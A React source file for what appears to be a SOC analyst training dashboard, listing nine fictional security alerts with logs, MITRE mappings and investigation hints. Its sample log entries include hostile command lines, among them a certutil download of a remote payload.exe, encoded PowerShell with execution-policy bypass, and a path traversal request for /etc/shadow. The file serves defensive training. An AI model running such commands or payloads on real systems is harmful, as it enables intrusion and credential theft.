import { useState } from "react";
import { cn } from "@/lib/utils";
import {
  Search, RotateCcw, ChevronDown, ChevronUp, Play, ThumbsUp, ThumbsDown, XCircle,
  Shield, Star, AlertTriangle, Square,
} from "lucide-react";
import SOCSidebar from "@/components/soc/SOCSidebar";
import Navbar from "@/components/Navbar";

// ── Types ──────────────────────────────────────────────────────
interface Alert {
  id: string;
  title: string;
  description: string;
  severity: "Critical" | "High" | "Medium" | "Low";
  logSource: string;
  hostname: string;
  username: string;
  mitreTechnique: string;
  mitreId: string;
  timestamp: string;
  status: "Open" | "Investigating" | "Closed";
  eventId: number;
  alertType: string;
  sourceIp: string;
  destIp: string;
  httpMethod: string;
  url: string;
  userAgent: string;
  triggerReason: string;
  relatedLogs: string[];
  investigationHints: string[];
  rawLog: string;
}

// ── Data ───────────────────────────────────────────────────────
const alertsData: Alert[] = [
  {
    id: "SOC-001",
    title: "Suspicious PowerShell Execution with Encoded Command",
    description: "A PowerShell process was spawned with a Base64-encoded command and execution policy bypass. Commonly associated with fileless malware and post-exploitation frameworks.",
    severity: "Critical",
    logSource: "Sysmon",
    hostname: "WKS-PC-0127",
    username: "jsmith",
    mitreTechnique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
    mitreId: "T1059.001",
    timestamp: "Jan 21, 2026, 02:32 PM",
    status: "Open",
    eventId: 4688,
    alertType: "Web Attack",
    sourceIp: "10.0.0.42",
    destIp: "185.220.101.34",
    httpMethod: "POST",
    url: "/api/exec?cmd=encoded",
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    triggerReason: "Base64-encoded PowerShell command detected with execution policy bypass flag (-ep bypass -enc).",
    relatedLogs: [
      "Sysmon Event ID 1 — Process Creation: powershell.exe -ep bypass -enc aQBlAHgA...",
      "Sysmon Event ID 3 — Network Connection: powershell.exe → 185.220.101.34:443",
      "Windows Security Event 4688 — New Process Created: powershell.exe (Parent: winword.exe)",
    ],
    investigationHints: [
      "Decode the Base64 string in the -enc parameter to reveal the actual PowerShell script.",
      "Check the parent process — if it's winword.exe, this may indicate macro-based initial access.",
      "Look for Sysmon Event ID 3 from powershell.exe to identify C2 communication.",
      "Search for Event ID 4104 (Script Block Logging) for the full deobfuscated script.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-21 14:32:18.442","ProcessId":7284,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -ep bypass -enc aQBlAHgA...","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","User":"CORP\\\\jsmith"}`,
  },
  {
    id: "SOC-002",
    title: "LSASS Memory Access — Credential Dumping Detected",
    description: "A non-standard process accessed LSASS memory. Technique used by Mimikatz to extract credentials.",
    severity: "Critical",
    logSource: "EDR",
    hostname: "WKS-PC-0089",
    username: "SYSTEM",
    mitreTechnique: "T1003.001 - OS Credential Dumping: LSASS Memory",
    mitreId: "T1003.001",
    timestamp: "Jan 21, 2026, 01:55 PM",
    status: "Investigating",
    eventId: 4663,
    alertType: "Data Leakage",
    sourceIp: "172.16.0.89",
    destIp: "172.16.0.1",
    httpMethod: "N/A",
    url: "N/A",
    userAgent: "N/A",
    triggerReason: "notepad.exe accessed lsass.exe memory with GrantedAccess 0x1010 — Mimikatz signature match.",
    relatedLogs: [
      "Sysmon Event ID 10 — Process Accessed: notepad.exe → lsass.exe (GrantedAccess: 0x1010)",
      "EDR Alert: Suspicious LSASS access from PID 5544 (notepad.exe)",
      "Windows Security Event 4663 — Object Access: lsass.exe memory read",
    ],
    investigationHints: [
      "notepad.exe accessing LSASS is highly abnormal — likely process injection or renamed binary.",
      "Check the hash of 'notepad.exe' binary — is it legitimate or a renamed tool?",
      "Look for Sysmon Event ID 8 (CreateRemoteThread) for process injection evidence.",
      "Check if any credentials were used for lateral movement after this event.",
    ],
    rawLog: `{"EventID":10,"UtcTime":"2026-01-21 13:55:32.998","SourceProcessId":5544,"SourceImage":"C:\\\\Windows\\\\System32\\\\notepad.exe","TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010"}`,
  },
  {
    id: "SOC-003",
    title: "Impersonating Domain MX Record Change Detected",
    description: "DNS MX record for a monitored domain was changed to an unauthorized mail server, potentially enabling email interception.",
    severity: "Medium",
    logSource: "Firewall",
    hostname: "DNS-SRV-01",
    username: "dns_admin",
    mitreTechnique: "T1071.004 - Application Layer Protocol: DNS",
    mitreId: "T1071.004",
    timestamp: "Jan 20, 2026, 09:44 AM",
    status: "Open",
    eventId: 326,
    alertType: "ThreatIntel",
    sourceIp: "203.0.113.50",
    destIp: "10.0.0.53",
    httpMethod: "DNS",
    url: "MX corp.local → mail.suspicious-domain.xyz",
    userAgent: "N/A",
    triggerReason: "MX record for corp.local was changed to point to an external unauthorized mail server.",
    relatedLogs: [
      "DNS Audit Log: MX record change for corp.local → mail.suspicious-domain.xyz",
      "Firewall Log: 203.0.113.50 → 10.0.0.53:53 DNS UPDATE request",
    ],
    investigationHints: [
      "Verify if the MX record change was authorized through change management.",
      "Check if mail.suspicious-domain.xyz appears in threat intelligence feeds.",
      "Review DNS admin account activity for signs of compromise.",
    ],
    rawLog: `{"EventID":326,"TimeCreated":"2026-01-20T09:44:00Z","RecordType":"MX","OldValue":"mail.corp.local","NewValue":"mail.suspicious-domain.xyz","Source":"203.0.113.50"}`,
  },
  {
    id: "SOC-004",
    title: "Arbitrary File Read on Checkpoint Security Gateway [CVE-2024-24919]",
    description: "Exploitation attempt targeting CVE-2024-24919 vulnerability allowing arbitrary file read on Checkpoint Security Gateway appliance.",
    severity: "High",
    logSource: "Firewall",
    hostname: "FW-GW-01",
    username: "N/A",
    mitreTechnique: "T1190 - Exploit Public-Facing Application",
    mitreId: "T1190",
    timestamp: "Jun 06, 2024, 11:22 AM",
    status: "Investigating",
    eventId: 316,
    alertType: "Web Attack",
    sourceIp: "45.33.32.156",
    destIp: "10.0.0.1",
    httpMethod: "POST",
    url: "/clients/MyCRL",
    userAgent: "python-requests/2.28.1",
    triggerReason: "HTTP POST request to /clients/MyCRL with path traversal payload targeting CVE-2024-24919.",
    relatedLogs: [
      "WAF Log: POST /clients/MyCRL — Path traversal detected",
      "Firewall IPS: CVE-2024-24919 exploit attempt from 45.33.32.156",
      "Access Log: 45.33.32.156 — User-Agent: python-requests/2.28.1",
    ],
    investigationHints: [
      "Check if the exploit was successful — look for response codes 200 with file content.",
      "Verify Checkpoint gateway is patched against CVE-2024-24919.",
      "Block source IP 45.33.32.156 at the perimeter firewall.",
      "Review other requests from the same source IP for additional exploitation attempts.",
    ],
    rawLog: `{"timestamp":"2024-06-06T11:22:00Z","src_ip":"45.33.32.156","dst_ip":"10.0.0.1","method":"POST","url":"/clients/MyCRL","status":200,"user_agent":"python-requests/2.28.1","payload":"aCSHELL/../../../etc/shadow"}`,
  },
  {
    id: "SOC-005",
    title: "Application Token Steal Attempt Detected",
    description: "An attempt to steal application authentication tokens was detected via crafted API request.",
    severity: "Medium",
    logSource: "EDR",
    hostname: "APP-SRV-02",
    username: "webapp_svc",
    mitreTechnique: "T1528 - Steal Application Access Token",
    mitreId: "T1528",
    timestamp: "Jan 19, 2026, 03:15 PM",
    status: "Open",
    eventId: 325,
    alertType: "Web Attack",
    sourceIp: "192.168.1.200",
    destIp: "10.0.0.80",
    httpMethod: "GET",
    url: "/api/v2/auth/tokens?include=refresh",
    userAgent: "curl/7.88.1",
    triggerReason: "Unauthorized API call attempting to enumerate and extract OAuth refresh tokens.",
    relatedLogs: [
      "API Gateway Log: GET /api/v2/auth/tokens — 403 Forbidden",
      "EDR: Suspicious curl execution targeting internal API endpoint",
    ],
    investigationHints: [
      "Check if the request came from an internal compromised host or an attacker.",
      "Review API access logs for webapp_svc account for other anomalous requests.",
      "Verify OAuth token rotation policies are in place.",
    ],
    rawLog: `{"timestamp":"2026-01-19T15:15:00Z","src_ip":"192.168.1.200","method":"GET","url":"/api/v2/auth/tokens?include=refresh","status":403,"user":"webapp_svc"}`,
  },
  {
    id: "SOC-006",
    title: "Palo Alto Networks PAN-OS Command Injection Exploitation",
    description: "Command injection vulnerability exploitation attempt detected on Palo Alto Networks PAN-OS device.",
    severity: "Critical",
    logSource: "Firewall",
    hostname: "PA-FW-01",
    username: "N/A",
    mitreTechnique: "T1190 - Exploit Public-Facing Application",
    mitreId: "T1190",
    timestamp: "Jan 18, 2026, 08:12 AM",
    status: "Open",
    eventId: 274,
    alertType: "Proxy",
    sourceIp: "91.215.85.17",
    destIp: "10.0.0.254",
    httpMethod: "POST",
    url: "/php/utils/router.php",
    userAgent: "Mozilla/5.0",
    triggerReason: "Command injection payload detected in POST body targeting PAN-OS management interface.",
    relatedLogs: [
      "IPS Alert: PAN-OS Command Injection from 91.215.85.17",
      "Firewall Log: POST /php/utils/router.php — Malicious payload in body",
      "Syslog: PA-FW-01 — Threat detected, action: alert",
    ],
    investigationHints: [
      "Verify PAN-OS firmware version and patch level.",
      "Check if the management interface is exposed to the internet (it shouldn't be).",
      "Block source IP 91.215.85.17 and check for successful exploitation.",
      "Review firewall configuration changes in the last 24 hours.",
    ],
    rawLog: `{"timestamp":"2026-01-18T08:12:00Z","src_ip":"91.215.85.17","dst_ip":"10.0.0.254","method":"POST","url":"/php/utils/router.php","threat_type":"command-injection","action":"alert"}`,
  },
  {
    id: "SOC-007",
    title: "Suspicious PowerShell Script Executed",
    description: "PowerShell script execution detected with obfuscated commands and network activity.",
    severity: "Medium",
    logSource: "Sysmon",
    hostname: "WKS-PC-0042",
    username: "mwilliams",
    mitreTechnique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
    mitreId: "T1059.001",
    timestamp: "Jan 17, 2026, 04:30 PM",
    status: "Closed",
    eventId: 163,
    alertType: "Web Attack",
    sourceIp: "10.0.0.42",
    destIp: "104.21.56.78",
    httpMethod: "GET",
    url: "hxxps://cdn-update[.]com/payload.ps1",
    userAgent: "PowerShell/7.3",
    triggerReason: "PowerShell downloaded and executed script from external suspicious domain.",
    relatedLogs: [
      "Sysmon Event ID 1 — powershell.exe -NoProfile -ExecutionPolicy Bypass -File payload.ps1",
      "Sysmon Event ID 3 — Network Connection: powershell.exe → 104.21.56.78:443",
    ],
    investigationHints: [
      "Retrieve and analyze the downloaded payload.ps1 script.",
      "Check if the domain cdn-update.com is flagged in threat intel.",
      "Review what the script did after execution — file drops, registry changes, etc.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-17 16:30:00","Image":"powershell.exe","CommandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File payload.ps1","User":"CORP\\\\mwilliams"}`,
  },
  {
    id: "SOC-008",
    title: "RDP Brute Force Detected",
    description: "Multiple failed RDP login attempts detected from external IP targeting domain controller.",
    severity: "Medium",
    logSource: "Windows Event Logs",
    hostname: "DC-01",
    username: "admin_svc",
    mitreTechnique: "T1110.001 - Brute Force: Password Guessing",
    mitreId: "T1110.001",
    timestamp: "Jan 17, 2026, 02:15 PM",
    status: "Investigating",
    eventId: 176,
    alertType: "Brute Force",
    sourceIp: "192.168.1.105",
    destIp: "10.0.0.10",
    httpMethod: "RDP",
    url: "N/A",
    userAgent: "N/A",
    triggerReason: "15 failed RDP login attempts within 3 minutes from single source IP.",
    relatedLogs: [
      "Windows Event 4625 (x15) — Failed Logon Type 10 from 192.168.1.105",
      "Windows Event 4776 — NTLM auth failure for admin_svc",
    ],
    investigationHints: [
      "Check if source IP 192.168.1.105 is internal or compromised.",
      "Look for Event ID 4624 after the failures — indicates successful brute force.",
      "Review if the RDP port is exposed externally.",
    ],
    rawLog: `{"EventID":4625,"TimeCreated":"2026-01-17T14:15:00Z","Computer":"DC-01","TargetUserName":"admin_svc","LogonType":10,"IpAddress":"192.168.1.105","FailureCount":15}`,
  },
  {
    id: "SOC-009",
    title: "Malicious Macro Has Been Executed",
    description: "Macro-enabled document executed a command shell, indicating potential malware delivery.",
    severity: "Medium",
    logSource: "Sysmon",
    hostname: "WKS-PC-0156",
    username: "mgarcia",
    mitreTechnique: "T1204.002 - User Execution: Malicious File",
    mitreId: "T1204.002",
    timestamp: "Jan 16, 2026, 11:42 AM",
    status: "Open",
    eventId: 205,
    alertType: "Malware",
    sourceIp: "10.0.0.156",
    destIp: "91.215.85.17",
    httpMethod: "GET",
    url: "hxxp://91.215.85.17/payload.exe",
    userAgent: "certutil/10.0",
    triggerReason: "WINWORD.EXE spawned cmd.exe which used certutil to download external payload.",
    relatedLogs: [
      "Sysmon Event ID 1 — cmd.exe (Parent: WINWORD.EXE)",
      "Sysmon Event ID 1 — certutil -urlcache -split -f http://91.215.85.17/payload.exe",
      "Sysmon Event ID 15 — Invoice-Q4-2025.docm:Zone.Identifier",
    ],
    investigationHints: [
      "The .docm file was likely delivered via phishing — check email gateway logs.",
      "certutil for downloading is a known LOLBin technique (T1105).",
      "Check if payload.exe was successfully downloaded and executed.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-16 11:42:17","Image":"cmd.exe","CommandLine":"cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe","ParentImage":"WINWORD.EXE","User":"CORP\\\\mgarcia"}`,
  },
];

const alertTypes = ["All Types", "Web Attack", "Data Leakage", "ThreatIntel", "Brute Force", "Malware", "Proxy"];

const sevConfig: Record<string, { icon: React.ReactNode; textClass: string; dotClass: string }> = {
  Critical: { icon: <Star className="w-3.5 h-3.5 fill-current" />, textClass: "text-red-400", dotClass: "text-red-500" },
  High: { icon: <AlertTriangle className="w-3.5 h-3.5" />, textClass: "text-orange-400", dotClass: "text-orange-500" },
  Medium: { icon: <Square className="w-3.5 h-3.5 fill-current" />, textClass: "text-yellow-400", dotClass: "text-yellow-500" },
  Low: { icon: <Square className="w-3.5 h-3.5 fill-current" />, textClass: "text-blue-400", dotClass: "text-blue-500" },
};

// ── Component ──────────────────────────────────────────────────
const Alerts = () => {
  const [selectedSeverity, setSelectedSeverity] = useState("all");
  const [selectedStatus, setSelectedStatus] = useState("all");
  const [selectedType, setSelectedType] = useState("All Types");
  const [searchQuery, setSearchQuery] = useState("");
  const [expandedId, setExpandedId] = useState<string | null>(null);

  const filteredAlerts = alertsData.filter((a) => {
    if (selectedSeverity !== "all" && a.severity !== selectedSeverity) return false;
    if (selectedStatus !== "all" && a.status !== selectedStatus) return false;
    if (selectedType !== "All Types" && a.alertType !== selectedType) return false;
    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      if (![a.title, a.id, a.hostname, a.username, a.mitreId, a.alertType].some((f) => f.toLowerCase().includes(q))) return false;
    }
    return true;
  });

  const openCount = alertsData.filter((a) => a.status === "Open").length;

  const resetFilters = () => {
    setSelectedSeverity("all");
    setSelectedStatus("all");
    setSelectedType("All Types");
    setSearchQuery("");
  };

  return (
    <main className="min-h-screen bg-background flex flex-col">
      <Navbar />
      <div className="flex flex-1 overflow-hidden">
        <SOCSidebar activeItem="Alerts" />

        <div className="flex-1 flex flex-col overflow-hidden">
          {/* Page Header */}
          <div className="px-6 pt-6 pb-4">
            <div className="flex items-center gap-4">
              <h1 className="text-2xl font-bold text-foreground tracking-tight">Alerts</h1>
              <div className="flex items-center gap-2">
                <span className="relative flex h-2.5 w-2.5">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-40" />
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-primary" />
                </span>
                <span className="text-sm text-muted-foreground">{openCount} alerts incoming</span>
              </div>
            </div>
          </div>

          {/* Filter Bar */}
          <div className="px-6 pb-4 flex flex-wrap items-center gap-3">
            <div className="relative min-w-[240px]">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <input
                type="text"
                placeholder="Search for an alert"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-card/50 border border-white/[0.08] rounded-lg px-4 pl-10 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 transition-colors"
              />
            </div>

            <button
              onClick={resetFilters}
              className="flex items-center gap-2 px-4 py-2 text-sm text-muted-foreground bg-card/50 border border-white/[0.08] rounded-lg hover:text-foreground hover:border-primary/30 transition-colors"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              Reset filters
            </button>

            <select
              value={selectedSeverity}
              onChange={(e) => setSelectedSeverity(e.target.value)}
              className="bg-card/50 border border-white/[0.08] rounded-lg px-3 py-2 text-sm text-muted-foreground focus:outline-none focus:border-primary/50 cursor-pointer"
            >
              <option value="all">Severity</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <select
              value={selectedStatus}
              onChange={(e) => setSelectedStatus(e.target.value)}
              className="bg-card/50 border border-white/[0.08] rounded-lg px-3 py-2 text-sm text-muted-foreground focus:outline-none focus:border-primary/50 cursor-pointer"
            >
              <option value="all">Status</option>
              <option value="Open">Open</option>
              <option value="Investigating">Investigating</option>
              <option value="Closed">Closed</option>
            </select>

            <select
              value={selectedType}
              onChange={(e) => setSelectedType(e.target.value)}
              className="bg-card/50 border border-white/[0.08] rounded-lg px-3 py-2 text-sm text-muted-foreground focus:outline-none focus:border-primary/50 cursor-pointer"
            >
              {alertTypes.map((t) => (
                <option key={t} value={t}>{t === "All Types" ? "Alert type" : t}</option>
              ))}
            </select>

            <span className="ml-auto text-xs text-muted-foreground">
              Show <span className="text-foreground font-medium">{filteredAlerts.length}</span> alerts
            </span>
          </div>

          {/* Alerts Table */}
          <div className="flex-1 px-6 pb-6 overflow-auto">
            <div className="bg-card/25 border border-white/[0.08] rounded-lg overflow-hidden">
              {/* Table Header */}
              <div className="grid grid-cols-[40px_100px_1fr_100px_100px_60px] md:grid-cols-[40px_100px_1fr_100px_100px_120px] border-b border-white/[0.08]">
                <div className="px-3 py-3 text-[11px] font-semibold text-muted-foreground uppercase tracking-wider"></div>
                <div className="px-3 py-3 text-[11px] font-semibold text-muted-foreground uppercase tracking-wider">Severity</div>
                <div className="px-3 py-3 text-[11px] font-semibold text-muted-foreground uppercase tracking-wider">Date / Title</div>
                <div className="px-3 py-3 text-[11px] font-semibold text-muted-foreground uppercase tracking-wider hidden md:block">EventID</div>
                <div className="px-3 py-3 text-[11px] font-semibold text-muted-foreground uppercase tracking-wider">Type</div>
                <div className="px-3 py-3 text-[11px] font-semibold text-muted-foreground uppercase tracking-wider"></div>
              </div>

              {/* Table Rows */}
              {filteredAlerts.map((alert) => {
                const sev = sevConfig[alert.severity];
                const isExpanded = expandedId === alert.id;

                return (
                  <div key={alert.id}>
                    <div
                      onClick={() => setExpandedId(isExpanded ? null : alert.id)}
                      className={cn(
                        "grid grid-cols-[40px_100px_1fr_100px_100px_60px] md:grid-cols-[40px_100px_1fr_100px_100px_120px] border-b border-white/[0.04] cursor-pointer transition-colors",
                        isExpanded ? "bg-primary/5" : "hover:bg-white/[0.03]"
                      )}
                    >
                      <div className="px-3 py-3 flex items-center">
                        <span className={sev.dotClass}>{sev.icon}</span>
                      </div>
                      <div className="px-3 py-3 flex items-center">
                        <span className={cn("text-xs font-semibold", sev.textClass)}>{alert.severity}</span>
                      </div>
                      <div className="px-3 py-3 min-w-0">
                        <div className="text-xs text-muted-foreground mb-0.5">{alert.timestamp}</div>
                        <div className="text-sm text-foreground truncate">
                          {alert.id} - {alert.title}
                        </div>
                      </div>
                      <div className="px-3 py-3 items-center hidden md:flex">
                        <span className="text-xs text-muted-foreground font-mono">{alert.eventId}</span>
                      </div>
                      <div className="px-3 py-3 flex items-center">
                        <span className="text-xs text-muted-foreground">{alert.alertType}</span>
                      </div>
                      <div className="px-3 py-3 flex items-center justify-center">
                        {isExpanded ? (
                          <ChevronUp className="w-4 h-4 text-muted-foreground" />
                        ) : (
                          <ChevronDown className="w-4 h-4 text-muted-foreground" />
                        )}
                      </div>
                    </div>

                    {/* Expanded Detail Panel */}
                    {isExpanded && (
                      <div className="bg-background/50 border-b border-white/[0.08]">
                        <div className="p-6">
                          <div className="flex items-start justify-between mb-5">
                            <div>
                              <h3 className="text-base font-semibold text-foreground mb-1">{alert.title}</h3>
                              <p className="text-sm text-muted-foreground leading-relaxed max-w-3xl">{alert.description}</p>
                            </div>
                            <span className={cn("text-xs font-semibold uppercase px-2.5 py-1 rounded border",
                              alert.status === "Open" && "border-red-900/40 bg-red-950/30 text-red-400",
                              alert.status === "Investigating" && "border-yellow-900/40 bg-yellow-950/30 text-yellow-400",
                              alert.status === "Closed" && "border-white/[0.08] bg-muted/20 text-muted-foreground",
                            )}>
                              {alert.status}
                            </span>
                          </div>

                          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6 p-4 bg-card/40 rounded-lg border border-white/[0.06]">
                            {[
                              { label: "Event ID", value: String(alert.eventId), mono: true },
                              { label: "Event Time", value: alert.timestamp },
                              { label: "Rule", value: alert.mitreId },
                              { label: "Source IP", value: alert.sourceIp, mono: true },
                              { label: "Destination IP", value: alert.destIp, mono: true },
                              { label: "HTTP Method", value: alert.httpMethod },
                              { label: "URL", value: alert.url, mono: true },
                              { label: "User Agent", value: alert.userAgent },
                            ].map((m) => (
                              <div key={m.label}>
                                <span className="text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">{m.label}</span>
                                <span className={cn("text-xs text-foreground break-all", m.mono && "font-mono")}>{m.value}</span>
                              </div>
                            ))}
                          </div>

                          <div className="mb-6 p-4 bg-card/40 rounded-lg border border-white/[0.06]">
                            <h4 className="text-[10px] text-muted-foreground uppercase tracking-wider font-semibold mb-2">Alert Trigger Reason</h4>
                            <p className="text-sm text-foreground leading-relaxed">{alert.triggerReason}</p>
                          </div>

                          <div className="mb-6 p-4 bg-card/40 rounded-lg border border-white/[0.06]">
                            <h4 className="text-[10px] text-muted-foreground uppercase tracking-wider font-semibold mb-2 flex items-center gap-1.5">
                              <Shield className="w-3 h-3" /> MITRE ATT&CK Mapping
                            </h4>
                            <span className="text-sm text-foreground font-mono">{alert.mitreTechnique}</span>
                          </div>

                          <div className="mb-6 p-4 bg-card/40 rounded-lg border border-white/[0.06]">
                            <h4 className="text-[10px] text-muted-foreground uppercase tracking-wider font-semibold mb-3">Related Log Entries</h4>
                            <div className="space-y-1.5">
                              {alert.relatedLogs.map((log, i) => (
                                <div key={i} className="px-3 py-2 bg-background/50 rounded border border-white/[0.04] text-xs font-mono text-muted-foreground leading-relaxed">
                                  {log}
                                </div>
                              ))}
                            </div>
                          </div>

                          <div className="mb-6 p-4 bg-card/40 rounded-lg border border-white/[0.06]">
                            <h4 className="text-[10px] text-muted-foreground uppercase tracking-wider font-semibold mb-3">Raw Log Data</h4>
                            <pre className="px-3 py-3 bg-background/80 rounded border border-white/[0.04] text-[11px] font-mono text-muted-foreground overflow-x-auto whitespace-pre-wrap break-all leading-relaxed max-h-48">
                              {JSON.stringify(JSON.parse(alert.rawLog), null, 2)}
                            </pre>
                          </div>

                          <div className="mb-6 p-4 bg-primary/5 rounded-lg border border-primary/10">
                            <h4 className="text-[10px] text-primary/80 uppercase tracking-wider font-semibold mb-3 flex items-center gap-1.5">
                              💡 Investigation Hints
                            </h4>
                            <div className="space-y-2">
                              {alert.investigationHints.map((hint, i) => (
                                <div key={i} className="flex gap-2.5">
                                  <span className="text-primary/60 text-xs font-bold mt-0.5 shrink-0">{i + 1}.</span>
                                  <span className="text-xs text-muted-foreground leading-relaxed">{hint}</span>
                                </div>
                              ))}
                            </div>
                          </div>

                          <div className="flex flex-wrap gap-2">
                            <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-primary/10 text-primary border border-primary/20 hover:bg-primary/20 transition-colors">
                              <Play className="w-3.5 h-3.5" />
                              Start Investigation
                            </button>
                            <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors">
                              <ThumbsUp className="w-3.5 h-3.5" />
                              True Positive
                            </button>
                            <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-orange-500/10 text-orange-400 border border-orange-500/20 hover:bg-orange-500/20 transition-colors">
                              <ThumbsDown className="w-3.5 h-3.5" />
                              False Positive
                            </button>
                            <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-muted/20 text-muted-foreground border border-white/[0.06] hover:bg-muted/30 transition-colors">
                              <XCircle className="w-3.5 h-3.5" />
                              Close Alert
                            </button>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}

              {filteredAlerts.length === 0 && (
                <div className="text-center py-16 text-muted-foreground text-sm">
                  No alerts match the current filters.
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </main>
  );
};

export default Alerts;
